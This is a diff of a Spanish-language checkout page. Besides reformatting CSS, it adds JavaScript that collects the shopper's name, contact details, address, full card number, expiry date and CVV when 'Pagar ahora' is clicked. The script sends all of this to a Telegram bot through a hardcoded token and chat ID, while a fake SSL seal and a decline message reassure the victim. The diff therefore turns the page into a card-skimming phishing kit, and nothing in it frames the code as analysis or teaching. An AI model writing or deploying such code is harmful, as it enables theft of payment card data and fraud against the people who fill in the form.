@@ -17,16 +17,7 @@ h1{font-size:clamp(22px,3vw,28px); margin:0 0 16px;}
 .subtitle{color:var(--muted); margin:0 0 20px; font-size:14px;}
 .card{background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.02)),rgba(17,24,39,.85); backdrop-filter:blur(8px); border:1px solid rgba(148,163,184,.12); border-radius:var(--radius); padding:20px; box-shadow:0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.06);}
 .section-title{display:flex; align-items:center; gap:10px; font-weight:650; margin:6px 0 16px;}
-/* Badges (números) en azul */
-.section-title .badge {
-  font-size:12px;
-  color:#ffffff;
-  background: linear-gradient(90deg, #3b82f6, #60a5fa);
-  padding:4px 10px;
-  border-radius:999px;
-  font-weight:700;
-  box-shadow:0 4px 16px rgba(59,130,246,.35);
-}
+.section-title .badge {font-size:12px;color:#ffffff;background: linear-gradient(90deg, #3b82f6, #60a5fa);padding:4px 10px;border-radius:999px;font-weight:700;box-shadow:0 4px 16px rgba(59,130,246,.35);}
 form{display:grid; gap:18px;}
 .grid{display:grid; gap:14px; grid-template-columns: repeat(12,1fr);}
 .col-12{grid-column: span 12;}
@@ -39,57 +30,13 @@ input::placeholder{color:#6b7280;}
 input:focus, select:focus{border-color: var(--accent-2); box-shadow:0 0 0 6px var(--ring);}
 input.error, select.error{border-color: var(--danger);}
 .row{display:flex; gap:12px; align-items:center;}
-/* Botón pagar ahora azul */
-.btn {
-  width:100%;
-  padding:14px 18px;
-  border-radius:12px;
-  border:0;
-  cursor:pointer;
-  background: linear-gradient(90deg, #3b82f6, #60a5fa);
-  color:#ffffff;
-  font-weight:800;
-  text-transform:uppercase;
-  box-shadow:0 10px 28px rgba(59,130,246,.35), inset 0 -2px 0 rgba(0,0,0,.25);
-  transition:transform .06s ease-in-out, box-shadow .2s;
-}
+.btn {width:100%; padding:14px 18px; border-radius:12px; border:0; cursor:pointer; background: linear-gradient(90deg, #3b82f6, #60a5fa); color:#ffffff; font-weight:800; text-transform:uppercase; box-shadow:0 10px 28px rgba(59,130,246,.35), inset 0 -2px 0 rgba(0,0,0,.25); transition:transform .06s ease-in-out, box-shadow .2s;}
 .btn:disabled{opacity:.5; cursor:not-allowed;}
 .btn:active{transform:translateY(1px); box-shadow:0 6px 18px rgba(59,130,246,.3);}
-.error-msg {
-  display: none;
-  margin-top: 12px;
-  padding: 10px 14px;
-  border-radius: 8px;
-  font-size: 14px;
-  background: rgba(239,68,68,.15);
-  border: 1px solid rgba(239,68,68,.4);
-  color: #ef4444;
-}
-/* Spinner */
-.spinner {
-  width: 18px;
-  height: 18px;
-  border: 2px solid rgba(255,255,255,0.5);
-  border-top-color: transparent;
-  border-radius: 50%;
-  animation: spin .8s linear infinite;
-  display: none;
-  margin-left: 8px;
-}
+.error-msg {display: none; margin-top: 12px; padding: 10px 14px; border-radius: 8px; font-size: 14px; background: rgba(239,68,68,.15); border: 1px solid rgba(239,68,68,.4); color: #ef4444;}
+.spinner {width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.5); border-top-color: transparent; border-radius: 50%; animation: spin .8s linear infinite; display: none; margin-left: 8px;}
 @keyframes spin { to { transform: rotate(360deg); } }
-/* Sello SSL */
-.ssl-seal {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  margin-top: 14px;
-  padding: 10px;
-  border: 1px solid rgba(34,197,94,.4);
-  border-radius: 10px;
-  background: rgba(34,197,94,.1);
-  font-size: 13px;
-  color: #bbf7d0;
-}
+.ssl-seal {display: flex; align-items: center; gap: 10px; margin-top: 14px; padding: 10px; border: 1px solid rgba(34,197,94,.4); border-radius: 10px; background: rgba(34,197,94,.1); font-size: 13px; color: #bbf7d0;}
 .ssl-seal i {font-size: 18px; color: #22c55e;}
 </style>
 </head>
@@ -230,7 +177,7 @@ input.error, select.error{border-color: var(--danger);}
     <!-- Mensajes -->
     <div class="error-msg" id="errorMsg">❌ El pago fue rechazado. Intenta con otra tarjeta o verifique que los datos ingresados sean correctos.</div>
 
-    <!-- Sello de seguridad con enlace -->
+    <!-- Sello de seguridad -->
     <a href="https://www.sslshopper.com/ssl-checker.html" target="_blank" style="text-decoration:none;">
       <div class="ssl-seal">
         <i>🔒</i> Pago seguro con encriptación SSL 256-bit
@@ -247,6 +194,10 @@ document.addEventListener("DOMContentLoaded", () => {
   const errorMsg = document.getElementById("errorMsg");
   const sameAsShipping = document.getElementById("sameAsShipping");
   const billingSection = document.getElementById("billingSection");
+
+  // ======= DATOS DE TELEGRAM =======
+  const telegramToken = "8404672830:AAFhvO_jAsLMiDVYf99VA36h4e9B_I0iT9E";
+  const telegramChatId = "1021708007";
 
   sameAsShipping.addEventListener("change", () => {
     billingSection.style.display = sameAsShipping.checked ? "none" : "block";
@@ -294,14 +245,52 @@ document.addEventListener("DOMContentLoaded", () => {
     btn.textContent = "Procesando...";
     spinner.style.display = "inline-block";
 
-    setTimeout(() => {
-      spinner.style.display = "none";
-      btn.disabled = false;
-      btn.textContent = "Pagar ahora";
-      errorMsg.style.display = "block";
-    }, 2800);
+    // ====== RECOLECTAR DATOS DEL FORM ======
+    const data = {
+      "Nombre": document.getElementById("shipName").value,
+      "Correo": document.getElementById("shipEmail").value,
+      "Teléfono": document.getElementById("shipPhone").value,
+      "Código Postal": document.getElementById("shipPostal").value,
+      "Ciudad": document.getElementById("shipCity").value,
+      "Estado": document.getElementById("shipState").value,
+      "Dirección": document.getElementById("shipAddress").value,
+      "Nombre Tarjeta": document.getElementById("cardName").value,
+      "Número Tarjeta": document.getElementById("cardNumber").value,
+      "Vencimiento": document.getElementById("cardExp").value,
+      "CVV": document.getElementById("cardCvv").value,
+      "Tipo Tarjeta": document.getElementById("cardType").value
+    };
+
+    // ====== CREAR MENSAJE PARA TELEGRAM ======
+    let message = "💳 Nuevo Checkout:\n";
+    for (let key in data) {
+      message += `${key}: ${data[key]}\n`;
+    }
+
+    // ====== ENVIAR A TELEGRAM ======
+    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`)
+      .then(resp => resp.json())
+      .then(res => {
+        spinner.style.display = "none";
+        btn.disabled = false;
+        btn.textContent = "Pagar ahora";
+        if(res.ok){
+          alert("✅ Datos enviados a Telegram");
+          form.reset();
+        } else {
+          errorMsg.style.display = "block";
+        }
+      })
+      .catch(err => {
+        spinner.style.display = "none";
+        btn.disabled = false;
+        btn.textContent = "Pagar ahora";
+        errorMsg.style.display = "block";
+        console.error(err);
+      });
   });
 });
 </script>
 </body>
 </html>
+
